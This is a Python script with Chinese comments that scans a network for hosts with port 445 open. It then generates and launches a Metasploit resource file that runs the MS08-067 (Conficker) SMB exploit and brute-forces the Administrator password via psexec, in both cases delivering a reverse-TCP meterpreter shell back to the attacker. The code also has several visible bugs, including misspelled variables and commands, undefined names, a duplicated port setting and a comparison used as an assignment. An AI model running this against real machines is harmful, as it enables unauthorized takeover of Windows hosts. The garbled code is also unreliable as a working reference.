import os
import optparse
import sys
import nmap
def findTarget(Hosts):              #掃描網段範圍內開放445埠的主機
    nmScan=nmap.PortScanner()
    nmScan.scan(Hosts,'445')
    targets=[]
    for t in nmScan.all_hosts():
        if nmScan[t].has_tcp(445):  #如果445埠提供了協議
            state=nmScan[t]['tcp'][445]['state']  #檢視445埠的狀態
            if state=='open':
                print('[+]Found Target Host:'+t)
                targets.append(t)
                
    return targets         #返回開放445埠的主機列表
def setupHandler(configFile,lhost,lport):            #監聽被攻擊的主機
    configFilee.write('use exploit/multi/handler\n')     #使用該預設釋出命令
    configFilee.write('set PAYLOAD windows/meterpreter/reverse_tcp\m')  #設定載荷、IP和埠
    configFilee.write('set LPORT '+str(lport)+'\n')
    configFilee.write('set LPORT '+lhost+'\n')
    configFilee.write('exploit -j -z\n')
    configFilee.write('setg DisablePayloadHandler 1\n')  #不重新
def confickerExploit(configFile,target,lhost,lport):            #漏洞利用
    configFile.write('use exploit/windows/smb/ms08_067_netapi\n')  #漏洞利用程式碼
    configFile.write('set RHOST '+str(target)+'\n')              #設定引數
    configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
    configFile.write('set LPORT'+str(lport)+'\n')
    configFile.write('set LHOST '+lhost+'\n')
    configFile.write('exxploit -j -z\n')
def smbBrute(configFile,target,passwdFile,lhost,lport):          #暴力破解SMB口令
    username='Administrator'
    pF=open(passwordFile,'r')
    for password in pF.readlines():
        password=password.strip('\n')
        configFile.write('use exploit/windows/smb/psexec\n')
        configFile.write('set SMBUser '+str(username)+'\n')
        configFile.write('set SMBPass '+str(password)+'\n')
        configFile.write('set RHOST '+str(target)+'\n')
        configFile.write('set PAYLOAD windows/meterpreter/reverse_tcp\n')
        configFile.write('set LPORT '+str(lport)+'\n')
        configFile.write('set LHOST '+lhost+'\n')
        configFile.write('exploit -j -z\n')
def main():
    configFile=open('meta.rc','w')
    usage='[-]Usage %prog -H <RHOSTS> -l/-L <LHOST> [-p/-P <LPORT> -F/-f <password File>]'
    parser=optparse.OptionParser(usage)
    parser.add_option('-H',dest='target',type='string',help='target host')
    parser.add_option('-p','-P',dest='lport',type='string',help='listen port')
    parser.add_option('-l','-L',dest='lhost',type='string',help='listen address')
    parser.add_option('-F','-f',dest='passwdFile',type='string',help='password file')
    (options,args)=parser.parse_args()
    if (options.target==None)|(options.lhost==None):
        print(parser.usage)
        exit(0)
    if lport==None:
        lport=='2333'
    passwdFile=options.passwdFile
    targets=findTarget(options.target)           #尋找目標
    setupHandler(configFile,lhost,lport)
    for target in targets:                       #逐個攻擊
        confickerExploit(configFile,target,lhost,lport)
        if passwdFile!=None:
            smbBrute(configFile,target,passwdFile,lhost,lport)
        configFile.close()
        os.system('msfconsole -r meta.rc')  #啟動metasploit並讀取配置檔案
if __name__=='__main__':
    main()